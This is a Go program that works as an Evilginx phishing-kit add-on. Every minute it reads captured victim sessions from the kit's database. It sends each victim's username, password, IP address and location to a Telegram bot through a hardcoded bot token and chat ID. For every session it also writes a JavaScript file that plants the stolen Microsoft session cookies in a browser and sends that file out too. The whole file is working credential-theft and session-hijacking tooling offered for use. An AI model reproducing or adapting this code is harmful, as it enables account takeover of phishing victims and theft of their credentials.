package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/tidwall/buntdb"
)

const (
	dbPath           = "/root/.evilginx/data.db"
	sentFile         = "/root/.evilginx/sent_sessions.json"
	telegramBotToken = "8198274021:AAGRBv8gPLXt2dtHbzdG9DzKV7mV7M5389U"
	telegramChatID   = "1129680954"
)

type Session struct {
	Id           int                                 `json:"id"`
	Phishlet     string                              `json:"phishlet"`
	LandingURL   string                              `json:"landing_url"`
	Username     string                              `json:"username"`
	Password     string                              `json:"password"`
	Custom       map[string]string                   `json:"custom"`
	BodyTokens   map[string]string                   `json:"body_tokens"`
	HttpTokens   map[string]string                   `json:"http_tokens"`
	Tokens       map[string]map[string]*CookieToken  `json:"tokens"`
	SessionId    string                              `json:"session_id"`
	UserAgent    string                              `json:"useragent"`
	RemoteAddr   string                              `json:"remote_addr"`
	CreateTime   int64                               `json:"create_time"`
	UpdateTime   int64                               `json:"update_time"`
}

type CookieToken struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	HttpOnly bool   `json:"httpOnly"`
}

func main() {
	sent := loadSent()
	for {
		newSent := checkAndSendNewSessions(sent)
		if len(newSent) > 0 {
			for _, id := range newSent {
				sent[id] = true
			}
			saveSent(sent)
		}
		time.Sleep(60 * time.Second)
	}
}

func loadSent() map[int]bool {
	sent := make(map[int]bool)
	data, err := ioutil.ReadFile(sentFile)
	if err == nil {
		_ = json.Unmarshal(data, &sent)
	}
	return sent
}

func saveSent(sent map[int]bool) {
	data, _ := json.MarshalIndent(sent, "", "  ")
	_ = ioutil.WriteFile(sentFile, data, 0644)
}

func checkAndSendNewSessions(sent map[int]bool) []int {
	db, err := buntdb.Open(dbPath)
	if err != nil {
		fmt.Println("Failed to open DB:", err)
		return nil
	}
	defer db.Close()

	var newSent []int
	db.View(func(tx *buntdb.Tx) error {
		tx.AscendKeys("sessions:*", func(key, val string) bool {
			var s Session
			if err := json.Unmarshal([]byte(val), &s); err == nil {
				if !sent[s.Id] && (s.Username != "" || len(s.Tokens) > 0) {
					fmt.Println("New session to send:", s.Id)
					err := sendToTelegram(s)
					if err == nil {
						newSent = append(newSent, s.Id)
					}
				}
			}
			return true
		})
		return nil
	})
	return newSent
}

func getIPLocation(ip string) string {
	resp, err := http.Get("https://ipinfo.io/" + ip + "/json")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "Unknown"
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "Unknown"
	}

	return fmt.Sprintf("%v, %v, %v (%v)", result["city"], result["region"], result["country"], result["org"])
}

func sendToTelegram(s Session) error {
	location := getIPLocation(s.RemoteAddr)

	msg := fmt.Sprintf(
		`📥 New OFFICE COOKIES LOG #%d

Username: %s
Password: %s
cookie link: %s
IP: %s
Location: %s
UserAgent: %s
CLICKED ON: %s
submitted log on: %s`,
		s.Id, s.Username, s.Password, s.LandingURL,
		s.RemoteAddr, location, s.UserAgent,
		time.Unix(s.CreateTime, 0).Format(time.RFC1123),
		time.Unix(s.UpdateTime, 0).Format(time.RFC1123),
	)

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
	_, err := http.PostForm(url, map[string][]string{
		"chat_id": {telegramChatID},
		"text":    {msg},
	})
	if err != nil {
		fmt.Println("Failed to send TG message:", err)
		return err
	}

	jsCode := generateInjectionJS(s)
	username := s.Username
	if username == "" {
		username = "no_username"
	}
	filename := fmt.Sprintf("/tmp/session_%d_%s.txt", s.Id, strings.ReplaceAll(username, "@", "_"))
	_ = os.WriteFile(filename, []byte(jsCode), 0644)
	defer os.Remove(filename)

	return sendTelegramFile(filename)
}

func sendTelegramFile(filepath string) error {
	file, err := os.Open(filepath)
	if err != nil {
		return err
	}
	defer file.Close()

	var b bytes.Buffer
	w := multipart.NewWriter(&b)
	_ = w.WriteField("chat_id", telegramChatID)

	part, _ := w.CreateFormFile("document", filepath[strings.LastIndex(filepath, "/")+1:])
	_, _ = io.Copy(part, file)
	w.Close()

	req, _ := http.NewRequest("POST", fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramBotToken), &b)
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("File send error:", err)
		return err
	}
	defer resp.Body.Close()
	return nil
}

func generateInjectionJS(s Session) string {
    cookies := []map[string]interface{}{}
    for domain, domainCookies := range s.Tokens {
        for _, token := range domainCookies {
            cookies = append(cookies, map[string]interface{}{
                "name":     token.Name,
                "value":    token.Value,
                "domain":   domain,
                "expirationDate": time.Now().Add(365 * 24 * time.Hour).UnixMilli(),
                "hostOnly": false,
                "httpOnly": token.HttpOnly,
                "path":     token.Path,
                "sameSite": "none",
                "secure":   true,
                "session":  true,
                "storeId":  nil,
            })
        }
    }
    jsCookies, _ := json.Marshal(cookies)
    email := s.Username
    if email == "" {
        email = "unknown"
    }
    return fmt.Sprintf("let ipaddress = \"%s\";\nlet email = \"%s\";\nlet password = \"%s\";\n!function(){\nlet e = %s;\nfor(let o of e)\ndocument.cookie=`${o.name}=${o.value};Max-Age=31536000;${o.path?`path=${o.path};`:\"\"}${o.domain?(o.path?\"\":\"path=/\")+\";\":\"\"}Secure;SameSite=None`;\nwindow.location.href=\"https://login.microsoftonline.com\"\n}();", s.RemoteAddr, email, s.Password, string(jsCookies))
}
